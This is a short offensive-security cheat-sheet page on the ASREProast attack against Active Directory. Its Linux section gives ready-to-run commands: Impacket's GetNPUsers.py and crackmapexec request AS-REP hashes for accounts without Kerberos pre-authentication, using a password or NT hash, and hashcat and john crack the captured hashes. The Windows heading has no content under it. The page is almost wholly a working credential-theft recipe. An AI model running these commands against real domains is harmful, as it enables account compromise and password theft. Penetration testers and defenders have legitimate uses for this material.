---
description: ASREProast attack with password
---

# ASREProast

#### Linux

{% code overflow="wrap" %}
```bash
# users list dynamically queried with a LDAP authenticated bind (password)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -dc-ip $KeyDistributionCenter 'DOMAIN/USER:Password'

# users list dynamically queried with a LDAP authenticated bind (NT hash)
GetNPUsers.py -request -format hashcat -outputfile ASREProastables.txt -hashes 'LMhash:NThash' -dc-ip $KeyDistributionCenter 'DOMAIN/USER'

crackmapexec ldap $TARGETS -u $USER -p $PASSWORD --asreproast ASREProastables.txt --KdcHost $KeyDistributionCenter

# crack hashes
hashcat -m 18200 -a 0 ASREProastables.txt $wordlist
john --wordlist=$wordlist ASREProastables.txt
```
{% endcode %}

#### Windows
